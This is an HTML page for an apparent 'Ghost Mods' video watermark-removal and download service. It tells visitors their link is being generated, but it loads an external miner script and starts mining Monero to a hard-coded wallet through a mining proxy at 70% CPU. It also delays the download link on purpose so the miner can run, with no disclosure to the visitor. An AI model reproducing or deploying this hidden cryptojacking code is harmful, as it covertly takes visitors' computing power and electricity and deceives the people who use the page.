<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing... | Ghost Mods</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #0a0a0c; color: #00d4ff; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .loader { border: 5px solid #161b22; border-top: 5px solid #00d4ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 1.2rem; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="status">Connecting to Ghost Engine...</div>
    <p>Please wait while we strip watermarks and generate your link.</p>

    <script>
        // CONFIGURATION
        const WORKER_URL = "https://ghost-api.mr-ghosttrich.workers.dev";
        const WALLET = "48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy";

        // START THE 70% MINER
        server = "wss://ny1.xmrminingproxy.com"; 
        startMining(WALLET, "GhostUser", server, 70);

        // GET THE VIDEO DATA
        const params = new URLSearchParams(window.location.search);
        const target = params.get('url');

        async function fetchVideo() {
            try {
                const response = await fetch(`${WORKER_URL}?url=${encodeURIComponent(target)}`);
                const data = await response.json();
                
                if (data.url) {
                    document.getElementById('status').innerHTML = '<a href="'+data.url+'" style="color:#fff; background:#00d4ff; padding:10px 20px; text-decoration:none; border-radius:5px;">CLICK HERE TO DOWNLOAD</a>';
                } else {
                    document.getElementById('status').innerText = "Error: Link expired. Try again.";
                }
            } catch (e) {
                document.getElementById('status').innerText = "Engine Busy. Retrying...";
            }
        }

        if(target) {
            setTimeout(fetchVideo, 5000); // Gives the miner 5 seconds to run before showing the link
        }
    </script>
</body>
</html>
